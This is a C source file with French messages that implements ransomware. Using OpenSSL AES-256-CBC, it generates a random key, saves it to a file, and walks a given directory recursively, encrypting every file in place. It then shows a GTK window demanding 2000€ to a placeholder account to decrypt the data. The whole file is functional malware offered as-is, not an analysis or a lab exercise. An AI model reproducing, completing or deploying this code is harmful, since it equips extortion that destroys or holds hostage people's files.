#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <gtk/gtk.h>
 
#define KEY_SIZE 32
#define IV_SIZE 16
 
void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}
 
void encrypt_file_in_place(const char *file_path, const unsigned char *encryption_key) {
    FILE *fp = fopen(file_path, "rb+");
    if (!fp) {
        perror("Impossible d'ouvrir le fichier pour le chiffrement");
        return;
    }
 
    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    rewind(fp);
 
    unsigned char *plaintext = malloc(filesize);
    if (fread(plaintext, 1, filesize, fp) != filesize) {
        perror("Échec de lecture du fichier");
        free(plaintext);
        fclose(fp);
        return;
    }
 
    unsigned char iv[IV_SIZE];
    unsigned char *ciphertext = malloc(filesize + EVP_MAX_BLOCK_LENGTH);
    int len, ciphertext_len;
 
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
 
    if (!RAND_bytes(iv, sizeof(iv))) handleErrors();
 
    if (!EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, encryption_key, iv)) handleErrors();
 
    if (!EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, filesize)) handleErrors();
    ciphertext_len = len;
 
    if (!EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
    ciphertext_len += len;
 
    rewind(fp);
    fwrite(iv, sizeof(iv), 1, fp);
    fwrite(ciphertext, 1, ciphertext_len, fp);
    ftruncate(fileno(fp), ciphertext_len + sizeof(iv));
 
    EVP_CIPHER_CTX_free(ctx);
    free(plaintext);
    free(ciphertext);
    fclose(fp);
}
 
void encrypt_directory_in_place(const char *dir_path, const unsigned char *encryption_key) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        perror("Échec d'ouverture du répertoire");
        return;
    }
 
    struct dirent *entry;
    char path[1024];
 
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
 
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);
        struct stat path_stat;
        stat(path, &path_stat);
 
        if (S_ISDIR(path_stat.st_mode)) {
            encrypt_directory_in_place(path, encryption_key);
        } else {
            encrypt_file_in_place(path, encryption_key);
            printf("Chiffré: %s\n", path);
        }
    }
    closedir(dir);
}
 
void show_encrypted_message_with_image() {
    GtkWidget *window;
    GtkWidget *label;
    GtkWidget *image;
    GtkWidget *vbox;
 
    gtk_init(0, NULL);
 
    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "Chiffrement Terminé");
    gtk_window_set_default_size(GTK_WINDOW(window), 500, 500);
    gtk_container_set_border_width(GTK_CONTAINER(window), 10);
 
    vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    gtk_container_add(GTK_CONTAINER(window), vbox);
 
    label = gtk_label_new("""Vos données ont été chiffrées, afin qu'elles soient dechiffrées vous devez payer 2000€ sur ce compte : 1234 5678 9101 1121""");
    image = gtk_image_new_from_file("./images/hac.jpg");
 
    gtk_box_pack_start(GTK_BOX(vbox), label, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);
 
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
 
    gtk_widget_show_all(window);
 
    gtk_main();
}
 
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <chemin_du_répertoire_à_chiffrer>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
 
    const char *key_file_path = "/path/for/the/key/file"; //specifier le nom et l'emplacement où sera stocké votre clé
    unsigned char encryption_key[KEY_SIZE];
 
    if (!RAND_bytes(encryption_key, sizeof(encryption_key))) {
        handleErrors();
    }
 
    FILE *key_file = fopen(key_file_path, "wb");
    if (!key_file) {
        perror("Impossible d'ouvrir la clé en écriture.");
        exit(EXIT_FAILURE);
    }
    if (fwrite(encryption_key, 1, KEY_SIZE, key_file) != KEY_SIZE) {
        perror("Échec de l'écriture de la clé de chiffrement dans le fichier");
        fclose(key_file);
        exit(EXIT_FAILURE);
    }
    fclose(key_file);
    printf("Clé de chiffrement sauvegarder dans %s\n", key_file_path);
 
    encrypt_directory_in_place(argv[1], encryption_key);
 
    printf("Le chiffrement a été effectué avec succès.\n");
 
    show_encrypted_message_with_image();
 
    return 0;
}
